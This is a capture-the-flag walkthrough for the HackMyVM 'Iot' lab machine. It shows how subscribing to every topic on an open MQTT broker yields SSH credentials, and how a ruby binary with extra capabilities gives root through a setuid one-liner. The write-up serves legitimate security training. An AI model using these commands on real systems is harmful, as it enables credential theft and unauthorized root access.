# URL
https://hackmyvm.eu/machines/machine.php?vm=Iot
# Concepts
* basic MQTT service enumeration
* taking note of Linux capabilities
# Method of solve
## Starting Scans
* we note that ports 22 and 1883 are open
## Initial Access
* because port 1883 is open, we can use a common tool to interact with it
```
https://github.com/bapowell/python-mqtt-client-shell
```
* to use the tool, we'll need install a couple of Python modules, preferably in a virtual environment:
```
pip install paho-mqtt
pip install --upgrade pip setuptools
```
* then run the tool and use the following commands
```
python mqtt_client_shell.py
logging off
connection
host <IP_ADDRESS>
connect
subscribe #
```
* after a few moments, we receive a message which is credentials for the SSH service
## Privilege Escalation
* there is are extra capabilities associated with the ruby binary:
```
/usr/sbin/getcap -r / 2>/dev/null
```
* we can use ruby to escalate privileges, which is highlighted on this page:
```
https://gtfobins.org/gtfobins/ruby/#shell
```
* use this command to become root:
```
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```
* finis


